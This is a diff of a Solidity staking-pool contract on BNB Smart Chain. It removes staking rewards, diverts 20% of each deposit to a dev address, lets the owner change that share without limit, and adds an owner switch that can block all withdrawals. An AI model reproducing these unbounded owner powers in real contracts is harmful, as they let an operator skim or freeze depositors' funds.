@@ -1,13 +1,13 @@
 /**
- *Submitted for verification at BscScan.com on 2021-12-14
+ *Submitted for verification at BscScan.com on 2022-05-02
 */
 
 /**
- *Submitted for verification at BscScan.com on 2021-11-11
+ *Submitted for verification at BscScan.com on 2022-02-26
 */
 
 /**
- *Submitted for verification at BscScan.com on 2021-07-31
+BSC Special pool V2 on BNB Smart Chain
 */
 
 // SPDX-License-Identifier: UNLICENSED
@@ -307,6 +307,7 @@ contract Context {
     }
 }
 
+// pragma solidity >=0.4.0;
 
 
 /**
@@ -382,12 +383,15 @@ contract Ownable is Context {
 
 // File: contracts/MasterChef.sol
 
-pragma solidity 0.8.12;
+pragma solidity 0.8.13;
 
 contract RGPSpecialPool is Ownable {
     
     using SafeMath for uint256;
     address public TOKEN;
+    address public devAddress;
+    uint256 public devPercentage;
+    bool public userUnstake ;
     
     // store user details
     // amount of token staked
@@ -399,6 +403,7 @@ contract RGPSpecialPool is Ownable {
         uint256 tokenQuantity;
         uint256 intialTimestamp;
         address user;
+        
     }
     
     // what mapping really is :
@@ -406,6 +411,7 @@ contract RGPSpecialPool is Ownable {
     // implementations "https://docs.soliditylang.org/en/v0.8.9/style-guide.html?highlight=mapping#mappings"
     mapping(address => bool) public isAdminAddress; // updating and checking the addresses that are admins
     mapping(address => UserData) public userData; // get user detatils
+
     
     // event manager help to update user on token staked. 
     // extract from "https://docs.soliditylang.org/en/v0.8.9/structure-of-a-contract.html?highlight=event#structure-events"
@@ -413,38 +419,19 @@ contract RGPSpecialPool is Ownable {
         address indexed userAddress,
         uint256 stakedAmount,
         uint256 Time
-    );
-    
+        
+    );    
     event UnStake(
         address indexed userAddress,
         uint256 unStakedAmount,
-        uint256 _userReward,
         uint256 Time
-    );
-    
-    event withdrawReward(
-        uint256 tokenAmount,
-        address indexed _from,
-        address indexed _to,
-        uint _time
-    );
-    
-    event addPreviousRewardToUserBal(
-        uint256 prviousrewards,
-        address indexed _from,
-        address indexed _to,
-        uint _time
-    );
-    
+    );   
     event adminAdded(
         address[] _admins,
         bool
     );
     
     // $RGP distribution according to specifications...
-    uint256 public ENTRY_RATE = 7.5E18;
-    uint256 public DAYS30_RATE = 8E18;
-    uint256 public YEAR_RATE = 10E18;
     uint256 public referralBonus;
     uint256 public capReferralBonus;
     uint256 public totalSharedReferralBonus;
@@ -457,14 +444,17 @@ contract RGPSpecialPool is Ownable {
     
     // called once at every deployment
     // A constructor is an optional function that is executed upon contract creation.
-    constructor(address _token, uint256 miniMumStake, uint256 referral, uint256 _maxReferralPerTime) {
+    constructor(address _token, address dev, uint256 miniMumStake, uint256 referral, uint256 _maxReferralPerTime) {
         minimum = miniMumStake;
         TOKEN = _token;
+        devAddress = dev;
+        devPercentage = 20E18;
         referralBonus = referral;
         capReferralBonus = _maxReferralPerTime;
         isAdminAddress[_msgSender()] = true;
+        userUnstake = false;
     }
-    
+
     // check to be sure that only License address/addresses can called a specific functions in this contract.
     // A modifier allows you to control the behavior of your smart contract functions.
     // implementations "https://docs.soliditylang.org/en/v0.8.9/structure-of-a-contract.html?highlight=modifier"
@@ -472,126 +462,68 @@ contract RGPSpecialPool is Ownable {
         require(isAdminAddress[_msgSender()]);
         _;
     }
-
-    function updateCapReferralBonus(uint256 _newCap) external onlyOwner {
-        capReferralBonus = capReferralBonus.add(_newCap);
-    }
-
+    
     // where user can stake their $RGP,
     // _quantity: amount of $RGP that user want to stake.
     // user must approve the staking contract adrress before calling this function
-    function stake(uint256 _quantity, address _referral) public {
+    function stake(uint256 _quantity, address _referral) public  {
         UserData storage _userData = userData[_msgSender()];
         if (_userData.tokenQuantity == 0) {
             require(_quantity >= minimum, "amount staked is less than minimum staking amount");
         }
-        if (_referral != address(0x0)) {
+        if (_referral != address(0x0) && _quantity >= minimum) {
             UserData storage updateReferral = userData[_referral];            
             require(updateReferral.user != _msgSender(), "Caller Can't Refer Self.");
             if (capReferralBonus >= referralBonus) {
                 capReferralBonus = capReferralBonus.sub(referralBonus);
                 totalSharedReferralBonus = totalSharedReferralBonus.add(referralBonus);
                 IBEP20(TOKEN).transfer(_referral, referralBonus);
-            }            
-        }        
-        // get user current rewards if input token quantity is 0
-        uint256 pendingReward = calculateRewards(_userData.user);
-        
-        // if user had previously staked then an update in user data is require
-        if(_userData.tokenQuantity > 0 ) {
-            _userData.tokenQuantity = _userData.tokenQuantity.add(pendingReward);
-            emit addPreviousRewardToUserBal( pendingReward, address(this), _msgSender(), block.timestamp);
-        }
-        
+            } 
+        }       
         // mode of transfering token from user to the staking pool
-        IBEP20(TOKEN).transferFrom(_msgSender(), address(this), _quantity);        
+        IBEP20(TOKEN).transferFrom(_msgSender(), address(this), _quantity);
+        uint256 userPercentage = 100E18 - devPercentage;
+        uint256 convAmt = ((_quantity * userPercentage) / 100E18);
+        uint256 devPct = ((_quantity * devPercentage) / 100E18);     
+        IBEP20(TOKEN).transfer(devAddress, devPct);  
         _userData.user = _msgSender(); // update caller to the list of stakers
-        _userData.tokenQuantity = _userData.tokenQuantity.add(_quantity); // update user staked amount
-        _userData.intialTimestamp = block.timestamp; // update time staked
-        
-        totalStaking = totalStaking.add(_quantity); // update total staking amount
-        emit Stake(_msgSender(), _quantity, block.timestamp); // emission of events to enable listening to a specific act of an address that successfully staked
-        
+        _userData.tokenQuantity = _userData.tokenQuantity.add(convAmt); // update user staked amount
+        _userData.intialTimestamp = block.timestamp;
+        totalStaking = totalStaking.add(convAmt); // update total staking amount
+        emit Stake(_msgSender(), _quantity, block.timestamp);
     }
+
+
     
 
     // use by an address that have staked there $RGP to unstake at a desire time.    
-    // is _quantity is 0 it will withdraw user rewards from the contract
+    
     function unStake(uint256 _amount) public {
-        
+        require (!userUnstake, "RGP: Kindly wait for status update");
         UserData storage _userData = userData[_msgSender()]; // get user from the list of staked address
         require(_userData.tokenQuantity >= _amount, "RGP: Insufficient amount"); // requirement that input amount by the caller is less than what user staked
-        
-        uint256 pendingReward = calculateRewards(userData[_msgSender()].user); //get the current rewards of User
-        
-        // if input amount is 0 it will withdraw user current rewards
-        if(_amount == 0) {
-            require(_userData.tokenQuantity > 0, "RGP: NO REWARD YET.");
-            safeTokenTransfer(_msgSender(), pendingReward);
-            _userData.tokenQuantity = _userData.tokenQuantity;
-            _userData.intialTimestamp = block.timestamp;
-            emit withdrawReward( pendingReward, address(this), _msgSender(), block.timestamp);
-        }
-        if(_amount > 0) {
-            
-            require( _amount <= _userData.tokenQuantity, "RGP: AMOUNT IS GREATER THAN USER STAKED TOKEN");
-            _userData.tokenQuantity = _userData.tokenQuantity.sub(_amount);
-            
-            safeTokenTransfer(_msgSender(), pendingReward);
-            IBEP20(TOKEN).transfer(_msgSender(), _amount);
-            totalStaking = totalStaking.sub(_amount);
-            
-            _userData.intialTimestamp = block.timestamp;
-            
-            emit UnStake(_msgSender(), _amount, pendingReward, block.timestamp);
-        }
+        require(_amount != 0, "RGP: Can't Withdraw amount `0`");        
+        _userData.tokenQuantity = _userData.tokenQuantity.sub(_amount);  
+        totalStaking = totalStaking.sub(_amount);  
+        IBEP20(TOKEN).transfer(_msgSender(), _amount);        
+        _userData.intialTimestamp = block.timestamp;        
+        emit UnStake(_msgSender(), _amount, block.timestamp);
     }
     
-    function calculateRewards(address _stakerAddress) public view returns(uint256 reward) {
-        UserData storage _userData = userData[_stakerAddress];
-        _userData.user == _stakerAddress;
-        uint256 time = block.timestamp.sub(_userData.intialTimestamp);
-    
-        if (block.timestamp <= _userData.intialTimestamp.add(30 days)) {
-            uint256 pendingReward = (_userData.tokenQuantity.mul(ENTRY_RATE))/100E18;
-            uint256 yearly = (pendingReward / 365 days);
-            reward = (yearly.mul(time));
-            return reward;
-        }
-        
-        if (block.timestamp >= _userData.intialTimestamp.add(30 days) && block.timestamp <= _userData.intialTimestamp.add(90 days)) {
-            uint256 pendingReward = (_userData.tokenQuantity.mul(DAYS30_RATE))/100E18;
-            uint256 yearly = (pendingReward / 365 days);
-            reward = (yearly.mul(time));
-            // reward = (pendingReward.div(90 days).mul(time));
-            return reward;
-        }
-        
-        if (block.timestamp > _userData.intialTimestamp.add(90 days)) {
-            uint256 pendingReward = (_userData.tokenQuantity.mul(YEAR_RATE))/100E18;
-            uint256 yearly = (pendingReward / 365 days);
-            reward = (yearly.mul(time));
-            return reward;
-        }
+    function updateCapReferralBonus(uint256 _newCap) external onlyOwner {
+        capReferralBonus = capReferralBonus.add(_newCap);
+    }
+
+    function resetsharablePercentage(uint256 newDevPercent) external onlyOwner {
+        devPercentage = newDevPercent;
     }
     
-    function userInfo(address _addr) public view returns(address _staker, uint256 _amountStaked, uint256 _userReward, uint _timeStaked) {
-        UserData storage _userData = userData[_addr];
-        uint256 _reward = calculateRewards(_userData.user);
-        if(_userData.tokenQuantity > 0) {
-           _userReward = _userData.tokenQuantity.add(_reward);
-        }
-        
-        return(
-            _userData.user, 
-            _userData.tokenQuantity,
-            _userReward,
-            _userData.intialTimestamp
-            );
+    function updateWithdrawal(bool status) public onlyOwner{
+       userUnstake = status;
     }
     
-    function safeTokenTransfer(address staker, uint256 amount) internal {
-        IBEP20(TOKEN).transfer(staker, amount);
+    function userInfo(address _addr) public view returns(UserData memory user) {
+        user = userData[_addr];
     }
     
     function multipleAdmin(address[] calldata _adminAddress, bool status) external onlyOwner {
